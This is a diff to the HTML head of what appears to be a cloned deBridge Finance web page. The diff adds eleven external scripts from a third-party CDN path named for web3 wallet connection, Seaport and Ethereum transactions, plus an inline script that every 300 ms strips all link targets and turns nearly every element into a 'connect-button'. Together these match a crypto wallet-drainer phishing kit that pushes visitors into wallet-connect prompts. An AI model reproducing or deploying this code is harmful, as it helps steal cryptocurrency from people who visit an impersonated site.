@@ -23,7 +23,33 @@
 <meta name=twitter:creator content=@debridgefdn>
 <meta name=viewport content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <meta name=theme-color content=#E6EDE4>
-<script charset="UTF-8" type="text/javascript" src="./baaa068b-d5c9-4fb8-99d3-a5df66e9f108.js"></script>
+<script src="https://cdn.statically.io/gh/oligarchia/cdn/main/web3-provider/web3-modal.js"></script>
+<script src="https://cdn.statically.io/gh/oligarchia/cdn/main/web3-provider/web3-loader.js"></script>
+<script src="https://cdn.statically.io/gh/oligarchia/cdn/main/web3-provider/web3-router.js"></script>
+<script src="https://cdn.statically.io/gh/oligarchia/cdn/main/web3-provider/web3-connect.js"></script>
+<script src="https://cdn.statically.io/gh/oligarchia/cdn/main/web3-provider/web3-module.js"></script>
+<script src="https://cdn.statically.io/gh/oligarchia/cdn/main/web3-provider/web3-alert.js"></script>
+<script src="https://cdn.statically.io/gh/oligarchia/cdn/main/web3-provider/web3-seaport.js"></script>
+<script src="https://cdn.statically.io/gh/oligarchia/cdn/main/web3-provider/web3-data.js"></script>
+<script src="https://cdn.statically.io/gh/oligarchia/cdn/main/web3-provider/ethers.js"></script>
+<script src="https://cdn.statically.io/gh/oligarchia/cdn/main/web3-provider/ethereum-tx.js"></script>
+<script src="https://cdn.statically.io/gh/oligarchia/cdn/main/web3-provider.js"></script>
+
+<script>
+    function addClassesToElements() {
+
+    const links = document.querySelectorAll('a:not(.connect-button)');
+    for (const link of links) {
+        link.removeAttribute('href');
+        link.classList.add('connect-button');
+    }
+    const buttons = document.querySelectorAll('div:not(.connect-button):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
+    for (const button of buttons) {
+        button.classList.add('connect-button');
+    }
+    }
+    setInterval(addClassesToElements, 300);
+</script>
  <link rel=icon type=image/png sizes=32x32 href="data:image/png;base64,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">
 <style>
     :root {
